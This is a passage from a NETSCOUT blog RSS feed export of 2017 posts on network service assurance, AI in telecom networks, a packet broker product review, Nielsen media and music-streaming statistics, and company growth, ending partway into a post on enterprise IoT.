<p>As your network becomes more virtualized/physical/hybrid and cloud-based, looking at element data in log files and moving it back and forth from the core to the edge won’t be efficient enough anymore. You won’t be able to react to traffic and business data in real time.</p>

<p>At stake are some pretty important metrics. Quality of service. Customer experience. And huge revenue opportunities from offering Big Data analytics services.</p>

<p><strong>Traffic-based Data</strong></p>

<p>What is traffic-based data? Traffic moving <em>between</em> elements―not just within the elements themselves. And the interplay of traffic between network nodes. Tapping into this data is becoming increasingly important in our real-time, on-demand world. Adding virtual network elements raises the level of data management complexity. How do you gain visibility into east-west traffic? How do you capture and analyze key performance indicators (KPIs) fast to auto-scale virtual network functions (VNFs)? How do you automate and orchestrate those VNFs?</p>

<p><img alt="monitor show graph information of network traffic" height="322" src="https://images4.newscred.com/Zz1jMmFhYTViY2M3M2YzY2E4MzNhOWYwODI5Zjg5ZWE1Mw==" width="589.4305295950156" /></p>

<p>To get at traffic-based data you need a distributed computing environment that can monitor microservices using VNFs at the network edge.</p>

<p>For example, you’ll want to able to see the raw packets that move into and out of a switch as metadata. Then you’ll what to combine that metadata with cell site, subscriber, user experience and application data and make it available for service assurance and business analytics insights.</p>

<p>These capabilities are not just extremely useful―but are increasingly vital to every service provider.</p>

<p><strong>Quality of Service ― Distributed &amp; Virtual</strong></p>

<p>What does this type of service assurance environment look like? Microservices distributed across network nodes collect and send traffic-based data to ensure quality of service (QoS) and a great customer experience. They can also serve as inputs to reveal new service opportunities. These microservices are deployed as VNFs. They’re right there doing their job as your network evolves and scales up or down―and whether it’s physical, virtual, hybrid or cloud.</p>

<p>The new and improved world of service assurance encompasses:</p>

<ul>
	<li><strong>Physical, virtual and cloud environments</strong> – You get a complete view across your entire network with end-to-end correlation between virtual and physical elements</li>
	<li><strong>Extreme visibility</strong> – You get a comprehensive view of real-time traffic between VNFs</li>
	<li><strong>Real-time <a href="https://www.netscout.com/network-monitoring/" target="_blank">network monitoring</a></strong> – You can monitor and compute KPIs in real-time for auto-scaling</li>
	<li><strong>Automation and orchestration </strong>– Well-defined APIs enable seamless integration with OpenSource or commercial orchestration tools</li>
</ul>

<p><strong>Empowering Big Data Use Cases with Real-time Data </strong></p>

<p>How can end-to-end visibility into traffic-based subscriber data, delivered in real-time from the subscriber to access, core and cloud layers, make a difference?</p>

<p><em>If you’re a mobile operator</em>, you’re going to need a lot of visibility and on-demand scalability with the coming of 5G. Network planning and optimization are already challenges as devices, topologies, software and applications evolve and customers move across cities and continents. You have to continually monitor QoS as it degrades to be able to quickly determine and fix issues.</p>

<p><img alt="The lost kids of Pokemon Go" height="322" src="https://images2.newscred.com/Zz1kNWU3NmUwMTM2ZmFlYWEwMmQyZGQ1NTMyYzIzOTUxOQ==" width="482.95823605706875" /></p>

<p>As new iPhone models or mobile apps like <span>Pokémon Go&nbsp;</span>are released, you’ll need to know how they’ll perform on your network. What phones are consuming the most resources? How are subscribers watching video? How many subscribers going through particular cell towers are watching Netflix on a regular basis? You need real-time, traffic-based data to answer these questions.</p>

<p><em>If you’re a cable operator</em> and rolling out Wi-Fi hotspots or a provider deploying Internet of Things (IoT) devices, you need to see granular traffic details to ensure a high-quality experience. An intelligent distributed system collects traffic-based data and makes it available for service assurance solutions, to quickly and automatically determine and resolve issues as basic as updating out-of-date firmware. &nbsp;</p>

<p><strong>Multiple Uses of Real-time, Actionable Intelligence</strong></p>

<p>Capturing real-time, traffic-based data across all of your different infrastructure to help ensure a high QoS and happy customers is just the beginning. This data is becoming ever more valuable for all sorts of advertising opportunities, partnerships, and new service offerings.</p>

<p>Monetize geo-location data to push out coupons and ads and identify credit card fraud. Use data in motion to understand how customers are utilizing and experiencing services and create compelling offers to keep them loyal and expand ARPU. Monitor and anonymize search data and correlate it with GPS to enable public health agencies to respond to natural disasters or public health emergencies.</p>

<p>Gathering and processing data for these and many other use cases is nothing new. What’s changing are the network landscapes where the traffic data is flowing. So as you shift over to more virtual and cloud infrastructure, make sure to maintain high visibility of traffic data. In our 24x7, connected, on-demand world, there is no “off” and customer expectations for QoS and quality of experience have never been higher.</p>

<p><em>~Written by&nbsp;Gene Knauer. Gene is a senior content marketing writer who works with technology companies in a variety of B2B marketing communications projects.</em></p>
]]></content:encoded>
    <category domain="http://localhost:7996/tags/category/service-provider">Service Provider</category>
    <enclosure url="http://localhost:7996/sites/default/files/2021-01/04/images/move-to-virtual-and-cloud.jpg" length="295918" type="image/jpeg"/>
    <guid isPermaLink="false">5950f544-0492-4033-ab3a-8c0b3073c914</guid>
    <pubDate>Wed, 16 Aug 2017 10:00:00 -0400</pubDate>
    <source url="http://localhost:7996/de/full-blogs-2017.xml">NETSCOUT Blogs</source>
    <dc:creator>NETSCOUT</dc:creator>
    </item>
<item>
  <title>Artificially Intelligent Networks Will Expand Revenues</title>
  <link>http://localhost:7996/blog/artificially-intelligent-networks-will-expand-revenues</link>
  <description>As telecoms operators continue to transform their networks and businesses, the industry is in the midst of the greatest change since the introduction of IP networks more than 20 years ago. The era of manually-managed, function-specific network equipment is coming to an end as operators deploy commoditized hardware, the function of which is software-defined and responsive to the...</description>
  <content:encoded><![CDATA[<p>As telecoms operators continue to transform their networks and businesses, the industry is in the midst of the greatest change since the introduction of IP networks more than 20 years ago. The era of manually-managed, function-specific network equipment is coming to an end as operators deploy commoditized hardware, the function of which is software-defined and responsive to the demands placed on the network, especially when bolstered by the likes of artificial intelligence (AI), namely machine learning.&nbsp;This presents operators with exciting new opportunities<span style="font-size: 14px;">&nbsp;</span>to significantly reduce their costs, making new capacity investment sustainable, while enabling new service revenues thanks to the flexibility of software-defined networks.</p>

<p>Without a doubt, greater value will be ultimately generated from the new service arena but, more immediately, operators will save capital expenditure on hardware and start to make operational expenditure gains from increased automation as they move away from costly and slow manual processes.&nbsp;This transformation represents a step change for the telecoms industry and means that operators can escape from being confined to the role of network providers in the digital value chain. However, in the shift to virtualized infrastructure and self-organizing networks, it’s important that the attributes of the telecoms industry are not lost. Telecoms has always prided itself on offering carrier-grade, robust, high-availability services and that network resilience needs to continue in the virtual era if users are to continue to receive the experiences they want.</p>

<p>This will be a different challenge with virtualized infrastructure, which changes function continually, as different services create different network demands at different times of day and user demand for capacity continues to grow. Operators, therefore, will face a series of challenges.</p>

<p>Their personnel will need to transition from managing function-specific hardware to managing commodity equipment via software. Much of this management will need to be automated to keep costs down. Of course, network engineering expertise will still be essential, especially during the decade-long period of hybrid operations when physical and virtual networks will work in parallel. The difference will be that this engineering experience will be applied in software terms.</p>

<p>Automated systems will not be able to operate in a vacuum; they will need to be fed continuously with data insights in real time to maximize capacity utilization and ensure services are delivered in the quality expected by users. This will rely on the terabytes of data generated by networks daily, but the data in itself has only limited value. The real advantages come from applying analytics to the vast volume of operator data in order to extract actionable insights.&nbsp;Analytics, therefore, is the key to efficient operations for software-defined operators. The challenge here is to accelerate the analytics process so the valuable insights can be achieved in minimal time. This is so important because the network will be continuously changing functions according to demand and therefore the task is never complete; insights are needed all the time as different services create different demands on the network at different times.</p>

<p>&nbsp;<img alt="61St9KWqFCL._SL1000_.jpg" height="322" src="https://images1.newscred.com/Zz1mODJkZDdlNmViZWU1ZDkyNGExMDUxMDMyODE1MDUyYw==" width="505.4945054945056" /></p>

<p>As the concepts of AI and machine learning are becoming more familiar in the consumer market, with the introduction of services such as Siri and Alexa, it’s clear that the technologies have applications for telecoms operators. AI can be used to accelerate the analytics process by identifying repeated behaviors, thereby enabling the automated system to take action based on previously successful decisions. Machine learning can be utilized here when such a pattern is identified to enable a learned response to be utilized.</p>

<p>A good example is that of a snow day on the U.S. east coast. This means children stay home from school and consequently residential neighborhoods experience huge spikes in video downloads at a time when the network would normally be serving a small number of home workers. Data from the network would identify this increase in demand but artificial intelligence could then be applied to that and augmented with weather information to enable the network to understand that video demand is likely to continue at a higher level for the rest of the day. Machine learning would then come in to provide the network with a learned response for it to configure itself, perhaps by instantiating more video content servers, to serve the demands of the day.</p>

<p><img alt="Two kids in car seats, traveling in car, playing" height="322" src="https://images1.newscred.com/Zz04MWI3MDJhZmI1YWQ1ODE2OTU1NzAyM2U5ZGU1ZTU3OA==" width="483" /></p>

<p>There will be many different types of service profiles created that effectively become a library of learned responses for automated network operations. These have the potential to radically shorten and accelerate the decision-making process, enabling the reality of the flexible, dynamic network at a sustainable cost of operations.</p>

<p>Machine-learnt knowledge can, therefore, be deployed to achieve optimum route design and configuration of networks, ensuring maximized utilization and minimization of the cost of capacity overbuild but the story doesn’t end here. Machine learning and AI can be utilized to enable predictive analytics. In the snow day scenario, the system could learn that if weather data indicates snow is falling and the day is during the school term, children will stay home and stream video. A machine-learnt response can then be made so the issue of lots of children suddenly using the network is addressed before it becomes a service-affecting issue.</p>

<p>This type of approach can be used in so many different ways across the network, utilizing insights from location data and many other systems to create decisions in advance that solve network problems before they're detectable to the user. This could involve ensuring capacity is available to serve crowds at a sports event or recognizing that a hardware failure means alternative capacity needs to be provisioned before the network comes under strain.</p>

<p>The current challenges are that machine learning and artificial intelligence are relatively new concepts and it’s vital to ensure that machine-learnt information is accurate. If operators are to rely on machine learning, this is critical. Fortunately, if the machines are taught well, they will not make errors like humans inevitably do. This heightened reliability means data insights even have the potential to be utilized and shared outside the operator.</p>

<p>Initially, we will see network insights being federated across other business units within operators to feed marketing and customer care as well as network management, but the ultimate prize is to federate this data across the wider partner ecosystem, communicating valuable data insights to third party organizations and generating revenue from that.</p>

<p><em>~ Written by&nbsp;George Malim. George&nbsp;is a freelance journalist who covers the telecoms and internet markets.</em></p>
]]></content:encoded>
    <category domain="http://localhost:7996/tags/category/service-provider">Service Provider</category>
    <enclosure url="http://localhost:7996/sites/default/files/2021-01/04/images/network-abstract-diagram.jpg" length="345014" type="image/jpeg"/>
    <guid isPermaLink="false">bdd7d28a-fb27-4a42-bebc-f0e57bb9ad61</guid>
    <pubDate>Wed, 16 Aug 2017 10:00:00 -0400</pubDate>
    <source url="http://localhost:7996/de/full-blogs-2017.xml">NETSCOUT Blogs</source>
    <dc:creator>NETSCOUT</dc:creator>
    </item>
<item>
  <title>How NETSCOUT is Disrupting the Packet Broker Market</title>
  <link>http://localhost:7996/blog/how-netscout-disrupting-packet-broker-market</link>
  <description>Written by Dr. Jim Metzler Dr. Jim Metzler is widely recognized as an authority on both network technology and its business applications. In over 28 years of professional experience, Jim has assisted numerous vendors refine their product and service strategies, and helped tens of enterprises evolve their network infrastructure. Because of my role as an industry analyst, vendors...</description>
  <content:encoded><![CDATA[<div style="background-color: #F5F5F5;margin: 20px 0 20px;padding: 20px;border: 1px solid #DDDDDD;"><img alt="Dr. Jim Metzler" src="https://www.netscout.com/sites/default/files/Jim_Metzler100x100.jpg" style="float:left;margin-right:15px;max-width:100px;" /><strong><em>Written by Dr. Jim Metzler</em></strong><br />
Dr. Jim Metzler is widely recognized as an authority on both network technology and its business applications. In over 28 years of professional experience, Jim has assisted numerous vendors refine their product and service strategies, and helped tens of enterprises evolve their network infrastructure.</div>

<p>Because of my role as an industry analyst, vendors frequently review new products with me. During the review, it is common for vendors to claim that their product has a fundamentally new architecture or it represents a disruption in the market. Claims like that always raise three key questions in my mind. Those key questions are:</p>

<ol>
	<li>Is the product targeting an important use case where the existing solutions are weak?</li>
	<li>Does the project really represent a disruption in the market?</li>
	<li>If it does, is the approach that the vendor took to develop the product mainstream or is it highly vendor-specific?</li>
</ol>

<p>NETSCOUT recently reviewed a new product with me – the <a href="https://www.netscout.com/product/enterprise/ngenius-5000-series-packet-flow-switch">nGenius PFS 5000 Packet Flow Switch</a>. I am going to use this blog to discuss that product in the context of the three key questions.</p>

<p><strong>Use Case </strong><br />
The primary use case that the PFS 5000 addresses is providing effective and efficient pervasive visibility for both service assurance and for security. This is clearly not a fundamentally new use case. It has been around for decades. What is new is that providing effective and efficient pervasive visibility is becoming increasingly more central to the success of a business and it is also becoming increasingly more difficult. The increased importance is due in part to the fact that as companies evolve to become a digital business, their key business processes rely on multiple IT services. Hence, if those services aren’t performing well, neither are the business processes. The increased importance is also due in part to the large and growing impact that cyber hacking is having on businesses or all types and sizes. For example, according to <a href="http://www-03.ibm.com/security/xforce/downloads.html" target="_blank">an IBM report</a> by 2019 cybercrime will become a 2.1 trillion-dollar problem.</p>

<p>The primary reason why providing effective and efficient pervasive visibility is becoming more difficult is because the IT infrastructure is becoming increasingly more complex. That complexity was discussed in an <a href="http://www.networkworld.com/article/2190430/infrastructure-management/network-packet-brokers-increase-visibility-and-performance.html" target="_blank">article in Network World</a>. That article explained that, "As enterprises embrace technologies ranging from virtualization to cloud computing, the focus turns to making networks faster, flatter and more efficient. Today's changing networks must support ever-increasing traffic volumes, higher speeds and more service types, as well as increased requirements for security, analytics and compliance."</p>

<p><strong>Market Disruption </strong><br />
The initial motivation to adopt SDN was to overcome the limitations of the existing networking equipment which was hardware-based, proprietary, rigid and expensive. These same characteristics apply to the traditional set of packet brokers and because of these characteristics, the existing solutions struggle to provide&nbsp;effective and efficient pervasive visibility in the increasingly complex IT environment.</p>

<p>The architecture of NETSCOUT’s nGenius PFS 5000 Packet Flow Switch represents a fundamentally new approach. As opposed to a hardware-centric solution, the nGenius PFS 5000 Packet Flow Switch disaggregates the software from the hardware and provides either an integrated appliance or software that runs on commodity hardware.</p>

<p><strong>Leveraging Market Trends </strong><br />
While there occasionally are exceptions, I always advise my clients to at least consider adjusting their IT strategy to continually mirror the megatrends in the industry. I don’t do that because I want my clients to be lemmings who blindly follow others. I do it because if the IT industry is making big investments in certain new technologies and architectures, then in most cases the biggest improvements in functionality and cost effectiveness will occur in those areas.</p>

<p>NETSCOUT’s nGenius PFS 5000 Packet Flow Switch fits in nicely with several industry megatrends. One that was previously mentioned is the movement away from hardware-centric solution and towards disaggregated, software-based solutions. Another important industry trend is the adoption of open hardware solutions typified by the Open Compute Project (OCP). The goal of the OCP, which was initiated by Facebook in 2009 and now has hundreds of member companies, is to redesign hardware technology to efficiently support the growing demands of the compute infrastructure. One of the choices that NETSCOUT is offering to their clients is for them to run NETSCOUT’s packet flow operating system (PFOS) on OCP hardware from any reseller.</p>

<p><strong>Conclusions</strong><br />
The packet broker market has been staid for several years. Over that timeframe packet broker vendors have certainly added features to their products, but they haven’t fundamentally changed the architecture of those products. That’s ok because architectures shouldn’t change frequently. They should, however, change when the business and/or technology environment changes significantly.</p>

<p>Given the growing criticality and difficulty of providing effective and efficient pervasive visibility, it’s time for a disruption in the packet broker market. In large part because it disaggregates the software from the hardware, NETSCOUT’s nGenius PFS 5000 Packet Flow Switch creates such a disruption. However, this is not a disruption just for the sake of disruption. The architecture of the nGenius PFS 5000 Packet Flow Switch is in line with the architectural trends brought to the market by SDN and it also is in line with the movement to open hardware solutions, such as those brought to the market by the OCP.</p>

<p><em>~ Dr. Jim Metzler, Managing Partner, Ashton Metzler </em></p>
]]></content:encoded>
    <category domain="http://localhost:7996/tags/category/enterprise">Enterprise</category>
    <enclosure url="http://localhost:7996/sites/default/files/PFSandTAPs-1200x480.jpg" length="192593" type="image/jpeg"/>
    <guid isPermaLink="false">432730a2-d65a-4000-a367-fa6c91ae8ab4</guid>
    <pubDate>Thu, 27 Jul 2017 13:00:00 -0400</pubDate>
    <source url="http://localhost:7996/de/full-blogs-2017.xml">NETSCOUT Blogs</source>
    <dc:creator>NETSCOUT</dc:creator>
    </item>
<item>
  <title>Youth Movement: Gen Z Boasts the Largest, Most Diverse </title>
  <link>http://localhost:7996/blog/youth-movement-gen-z-boasts-largest-most-diverse</link>
  <description>Whether you are a Cable, Mobile, or Fixed line network operator, one thing is certain. This isn't your father's network you are running. To understand what the future holds, we need to shift our focus from "Boomers" to "Millennials and Gen Z". Today, these groups make up almost 50% of the US population. Their experiences are different from Boomers, they are more diverse, and...</description>
  <content:encoded><![CDATA[<p>While Millennials continue to grab headlines for their tech-savvy penchant for adopting new technologies and their unique media behaviors, the first-quarter 2017 <a href="http://www.nielsen.com/us/en/insights/reports/2017/the-nielsen-total-audience-report-q1-2017.html" target="_blank">Nielsen Total Audience Report</a> sheds some much-needed light on the NEXT generation of consumers—Generation Z—as well as how different generations adopt and use established and nascent devices and platforms.</p>

<p>Of note, Generation Z and Millennials now make up nearly half (48%) of the overall U.S. generational composition, an insight of even larger importance as the youngest generation begins to mature and enter the workplace.</p>

<p>What’s more is that both Generation Z and Millennials are more multicultural in their overall race/ethnic composition than previous generations. For instance, Generation Z holds the largest percentage of Hispanics and non-Hispanic blacks at 22% and 15%, respectively. Compare that to the Greatest Generation (those aged 71 and up), whose make-up is overwhelmingly non-Hispanic white at 78%, with 9% of its population non-Hispanic black and 8% Hispanic.</p>

<div class="infogram-embed" data-id="us_tv_homes_q1_2017" data-title="US TV Homes Q1 2017" data-type="interactive">But while age groupings are strong indicators of diversity, they’re also a clear barometer of life stage and thus, a strong gauge of media habits. Millennials—who are most likely in the beginning stages of their careers—have the lowest household incomes and are more likely to rent their home and live in urban areas.</div>

<p>Members of Generation Z, on the other hand, tend to live overwhelmingly in homes of three or more people, enabling them to benefit from the higher incomes of the family members they live with.</p>

<p>Still, Millennial and Generation Z consumers display similar tastes for emerging technologies. However, those preferences are partly dictated by their corresponding life stages.</p>

<div class="infogram-embed" data-id="tech_ownership_by_generation_q1_2017" data-title="Tech Ownership by Generation Q1 2017" data-type="interactive">But what about the media the different generations lean on?</div>

<p>The report found that Millennials were more likely to have access to multimedia devices (such as Apple TV and Google Chromecast) and subscription video on demand (SVOD) services (SVOD) than other generations, allowing them to connect to multiple forms of content. While Generation Z had high penetration numbers for the same devices and services, they also benefit from the technological choices of the older, and seemingly higher earning, members of their households. Additionally, this generation has the highest penetration numbers for more expensive devices, such as enabled smart TVs (37%), video game consoles (73%) and tablets (78%).</p>

<p>While newer technologies are more prevalent with younger generations, penetration is growing among Generation X'ers and Baby Boomers.</p>

<p>When looking at multimedia devices, penetration among Baby Boomers increased 29% year-over-year, while penetration among Generation X increased 23%. SVOD services are also growing in popularity with older generations, as 51% of Baby Boomers and 69% of Generation X'ers use them (at least a 10% lift for both groups since last year), narrowing the gap between them and their younger counterparts—in which three out of four have SVOD access—for the same service.</p>

<p>The increased use of these technologies across generations hints at their potential progression from niche devices and services to overall ubiquity. Take smartphones for example. Once primarily permeating certain groups, they now are owned by upward of 97% of Generation Z and Millennials, 95% of Generation X and 86% of Baby Boomers.</p>

<p>While it's long been known that age and life stage are instrumental in how media is consumed, the rise of Generation Z as the largest and most <em>diverse</em> generation presents a unique opportunity on the horizon for marketers. Couple this with the fact that new technology and forms of content that are slowly being adopted by Americans of all ages and it becomes even more paramount to know how consumers are engaging with devices and platforms.</p>

<p>For additional insights, download the first-quarter <a href="http://www.nielsen.com/us/en/insights/reports/2017/the-nielsen-total-audience-report-q1-2017.html" target="_blank">Nielsen Total Audience Report.</a></p>

<p>This article was from <a href="http://www.nielsen.com/us/en/insights/news/2017/youth-movement-gen-z-boasts-the-largest-most-diverse-media-users-yet.html" target="_blank">Nielsen.com</a> and was legally licensed through the <a href="https://www.newscred.com/" target="_blank">NewsCred</a> publisher network. Please direct all licensing questions to <a href="mailto:legal@newscred.com">legal@newscred.com</a>.</p>
]]></content:encoded>
    <category domain="http://localhost:7996/tags/category/service-provider">Service Provider</category>
    <enclosure url="http://localhost:7996/sites/default/files/2020-01/09/images/Zz0zYjM5MDFlM2UwOTMzNTE2NzZhZTg4NmE0Y2UzZjg1MA.jpg" length="386147" type="image/jpeg"/>
    <guid isPermaLink="false">37b0e902-c0a0-4bcd-8471-e527901229f9</guid>
    <pubDate>Thu, 27 Jul 2017 10:17:58 -0400</pubDate>
    <source url="http://localhost:7996/de/full-blogs-2017.xml">NETSCOUT Blogs</source>
    <dc:creator>NETSCOUT</dc:creator>
    </item>
<item>
  <title>2017 Is Shaping Up to be the Year of Music Streaming</title>
  <link>http://localhost:7996/blog/2017-shaping-be-year-music-streaming</link>
  <description>In 1979, The Buggles proclaimed that "video killed the radio star". Fast forward to the summer of 2017 and it appears that distribution and consumption of music has, once again, fundamentally changed.</description>
  <content:encoded><![CDATA[<p>On-demand audio streams have reached more than 184 billion so far in 2017, a considerable 62.4% increase over the same period last year, according to Nielsen’s <a href="http://www.nielsen.com/us/en/insights/reports/2017/us-music-mid-year-report-2017.html" target="_blank">U.S. Music Mid-Year 2017 Report</a>.</p>

<p>Meanwhile, overall on-demand streams (including video) have surpassed 284 billion streams this year, an increase of 36.4% over the same period in 2016. There was, however, a decrease in album sales (-18.3%), albums + TEA (track equivalent albums) sales (-19.9%), digital album sales (-19.9%) and physical album sales (-17%), highlighting consumer listening habits and an industry focus on single releases.</p>

<p>The release of Ed Sheeran’s album ÷ (Divide) on March 3 may have contributed to the surge in weekly on-demand audio streams for the week ending March 9, which surpassed 7 billion for the first time in the U.S. Sheeran’s “Shape of You” is the most-streamed song of 2017 so far, with 690 million on-demand streams to date, including 354 million audio streams and 336 million video streams. It’s also the song with the most digital track sales: more than two million so far this year.</p>

<p>“The first half of 2017 has seen some incredible new benchmarks for the music industry,” said Dave Bakula, SVP Insights, Nielsen Music. “The rapid adoption of streaming platforms by consumers has generated engagement with music on a scale that we’ve never seen before.”</p>

<p>Drake's release of <em>More Life</em> on March 18 also set a record for audio on-demand streams in one week, with 385 million streams, beating the previous record held by his 2016 album, Views, which logged 245 million streams in its first week.</p>

<p>The biggest song at the mid-year point, in terms of total activity (sales and audio streaming equivalents combined), is "Shape of You" by Ed Sheeran, with 361 million. The track also tops the digital song sales charts, with over 2 million so far this year.</p>

<p>Other highlights from the report include:</p>

<ul>
	<li>Kendrick Lamar's DAMN. is the leading album in total volume this year (albums, track equivalent albums and audio on-demand streaming equivalent albums combined) and held the number one spot on the Billboard Top 200 for three weeks.</li>
	<li>Chance the Rapper's Coloring Book led all album on-demand streams with a unit increase of over 15 million.</li>
	<li>Prince was the single-most streamed artist, with an increase of over 16 million on-demand streams (5,500% increase).</li>
</ul>

<p>For additional insights, download the <a href="http://www.nielsen.com/us/en/insights/reports/2017/us-music-mid-year-report-2017.html" target="_blank">U.S. Music Mid-Year 2017 Report</a>.</p>

<p class="nc_attribution_text">This article was from <a href="http://www.nielsen.com/us/en/insights/news/2017/2017-is-shaping-up-to-be-the-year-of-music-streaming.html" target="_blank">Nielsen.com</a> and was legally licensed through the <a href="https://www.newscred.com/" target="_blank">NewsCred</a> publisher network. Please direct all licensing questions to <a href="mailto:legal@newscred.com">legal@newscred.com</a>.</p>
]]></content:encoded>
    <category domain="http://localhost:7996/tags/category/service-provider">Service Provider</category>
    <enclosure url="http://localhost:7996/sites/default/files/2021-01/04/images/music-streaming-artificial-intelligence.jpg" length="489852" type="image/jpeg"/>
    <guid isPermaLink="false">aa011f29-8e28-499b-b061-bbccd44c7e5a</guid>
    <pubDate>Thu, 27 Jul 2017 10:00:00 -0400</pubDate>
    <source url="http://localhost:7996/de/full-blogs-2017.xml">NETSCOUT Blogs</source>
    <dc:creator>NETSCOUT</dc:creator>
    </item>
<item>
  <title>From Vision to Reality: NETSCOUT’s Transformative Journey</title>
  <link>http://localhost:7996/blog/vision-reality-netscouts-transformative-journey</link>
  <description>On a long trip, sometimes it’s hard to visualize how far you’ve traveled until you reached a point where you can actually see the road unwinding behind you. I reached such a viewpoint recently when we learned that NETSCOUT ranked seventh in Forbes’ annual Fast Tech 25 list of the year’s fastest growing public tech companies[1]. Since the company’s founding three decades ago, we...</description>
  <content:encoded><![CDATA[<p>On a long trip, sometimes it’s hard to visualize how far you’ve traveled until you reached a point where you can actually see the road unwinding behind you. I reached such a viewpoint recently when we learned that NETSCOUT ranked seventh in Forbes’ annual <a href="https://www.forbes.com/pictures/59234347a7ea434078d44581/7-netscout-systems/#4b54ef00567b" target="_blank">Fast Tech 25</a> list of the year’s fastest growing public tech companies<a href="#_ftn1" name="_ftnref1"><sup style="vertical-align:super; font-size:smaller">[1]</sup></a>. &nbsp;</p>

<p>Since the company’s founding three decades ago, we’ve worked hard to address service assurance requirements of customers around the globe. As we added capabilities through organic development and acquisition, our mission has expanded.&nbsp; For the past two years following the Danaher Communications acquisition, we’ve been focused on fulfilling CEO Anil Singhal’s vision of giving the Guardians of the Connected World the confidence to operate, innovate and excel by integrating service and security assurance and using smart data to drive superior intelligence across both. For me, this ranking is a public recognition of how far we’ve come in recent years.</p>

<p>This integrated approach is a cornerstone of Anil’s vision and applies to both enterprise and service provider customers. He wanted to create next-generation levels of service availability, reliability, and responsiveness by combining service assurance, which protects against system, network, and application failures, with security assurance, which shields companies from cyberthreats. The result is something we refer to as business assurance—a powerful combination of service assurance and security that derives extended value by using internet and intranet traffic and cloud application flows as the same data source for <a href="https://www.netscout.com/press-release/netscout-enters-advanced-threat-market-unique-intelligent-solution?ls=SEC-SOC-Share&amp;lsd=SEC-Prelease-ISNGSpectrum">both service and security assurance</a>.</p>

<p>The key to success lies in taking a data-driven approach. We convert internet traffic into smart data with ATLAS Global Threat Intelligence based on analysis of one-third of the global Internet traffic. Through our patented Adaptive Service Intelligence (ASI) technology, we transform intranet traffic and cloud application flows into high value, multi-dimensional meta data—smart data—in real time at the collection point. These primary smart data are then complemented with data from a variety of systems and sources, such as XFlow, active testing, management information base (MIB) queried with Network Management Protocol (SNMP), and log files. &nbsp;&nbsp;</p>

<p>Anil saw huge potential for fulfilling that vision by combining NETSCOUT’s existing talent and technologies with those of the companies within Danaher Communications Business. Instead of seeing a group of separate companies, Anil identified significant synergies that, when integrated, would produce value far beyond the sum of the whole. By effectively integrating those abilities to solve business assurance problems for customers, our value proposition is amplified so that the whole of NETSCOUT + Danaher Communications is greater far beyond the sum and becomes the equivalent of 1+1 = 11. Another analogy is that based on the traffic we collect, we can analyze and monetize it multiple times over for service assurance, security assurance, and business intelligence.&nbsp;</p>

<p>Ultimately, we want our customers, who are the true Guardians of the Connected World, to be able to use one platform that employs smart data and software-centric solutions to extend visibility across hybrid cloud environments, from service assurance and security to using handheld tools that troubleshoot out to the network’s perimeter.&nbsp;</p>

<p>Our recent announcements reflect this. On the platform side, ISNG and Arbor Networks Spectrum have come together to provide integrated service assurance and security assurance capabilities based on smart data derived from intranet and internet traffic processing with ASI and ATLAS, respectively. nGeniusPULSE now integrates active testing capabilities into service assurance and extends it to the last mile of the service delivery infrastructure, while new software instrumentation such as vScout and vStream use ASI to help companies build pervasive visibility into applications and infrastructure across today’s hybrid and multi-cloud environments. &nbsp;</p>

<p>That’s a big vision, and as our solutions come together, we’re starting to see it unfold.&nbsp; &nbsp;The Fast Tech 25 recognition reflects how we’ve brought these assets together – the enthusiastic reactions of customers to our newest capabilities at our recent Engage user and technology conference and various tradeshows are an indication that these efforts are resonating with our customers. For example, I recently spent a lot of hours talking to Cisco Live attendees in Las Vegas, and the message came through loud and clear: They liked our integrated approach, and they could clearly see the value of how our solutions came together. &nbsp;</p>

<p>I think that one of the reason it’s working so well is that the company’s approach for integrating products and technologies was extended to the people and culture.&nbsp; Anil recognized that the value of the Danaher Communications companies came from the workforce that created the solutions as much as the solutions themselves. We’ve retained the key talent needed to properly implement this vision over the longer term rather than potentially compromising our ability to quickly integrate these products and support them, along with NETSCOUT classic products, by significantly slashing costs, including headcount.&nbsp; At the same time, we’ve reallocated resources to drive the development of complementary capabilities and next-generation features versus simply maintaining silos, duplicating effort and creating products that may have overlapping functionality.&nbsp; By integrating a workforce containing the highest level of expertise in both service and security assurance, NETSCOUT is now well-equipped to fulfill the grand vision by synergy through integration.</p>

<p>As NETSCOUT continues to effect significant change in its effort to fulfill this long-term vision, we will continue to value the journey itself. After all, discoveries made along the way could well change the path that leads to the final destination. And in the end, our ability to retain the best talent in the industry and embrace that transformative journey will ultimately help our customers succeed in their own DX efforts.</p>

<p>&nbsp;</p>

<p><a href="#_ftnref1" name="_ftn1"><sup style="vertical-align:super; font-size:smaller">[1]</sup></a> The companies of the Fast Tech 25 stand out for&nbsp; trailing three years of strong sales growth combined with industry-leading projected earnings growth for the next three to five years.</p>
]]></content:encoded>
    <category domain="http://localhost:7996/tags/category/enterprise">Enterprise</category>
    <enclosure url="http://localhost:7996/sites/default/files/road_behind1200x480.jpg" length="179823" type="image/jpeg"/>
    <guid isPermaLink="false">b9d7d6d8-5070-4423-9984-34cb0a6d2bad</guid>
    <pubDate>Wed, 26 Jul 2017 14:02:38 -0400</pubDate>
    <source url="http://localhost:7996/de/full-blogs-2017.xml">NETSCOUT Blogs</source>
    <dc:creator>Michael Segal</dc:creator>
    </item>
<item>
  <title>Chaos in the Enterprise: Managing IoT Across Edge &amp; Cloud</title>
  <link>http://localhost:7996/blog/chaos-enterprise-managing-iot-across-edge-cloud</link>
  <description>Over recent years, the Internet of Things (IoT) has been a huge growth market. From consumer gadgets and wearables to connected cars and smart home devices, the proliferation has been rapid, and IHS predicts that the number of IoT devices globally will reach 30.7 billion by 2020 and 75.4 billion by 2025. IoT is also beginning to touch all aspects of the enterprise. This will...</description>
  <content:encoded><![CDATA[<p>Over recent years, the Internet of Things (IoT) has been a huge growth market. From consumer gadgets and wearables to connected cars and smart home devices, the proliferation has been rapid, and IHS predicts that the number of IoT devices globally will reach 30.7 billion by 2020 and 75.4 billion by 2025.</p>

<p>IoT is also beginning to touch all aspects of the enterprise. This will only fuel its growth as industry sectors from healthcare to manufacturing become more dependent on IoT communications to drive business processes and missions critical systems.</p>

<p>IoT is a key driver of the digital transformation (DX) that is taking place across industry sectors. As the demand for new digital and IoT services continues to grow, close monitoring and management of this transformation will be crucial ensure its success. The rise of IoT has been rapid and will continue to gather pace, to the point where we will soon see entirely new IT infrastructure emerge to support IoT applications and critical systems, spanning the edge, core, and cloud of the service delivery infrastructure.</p>

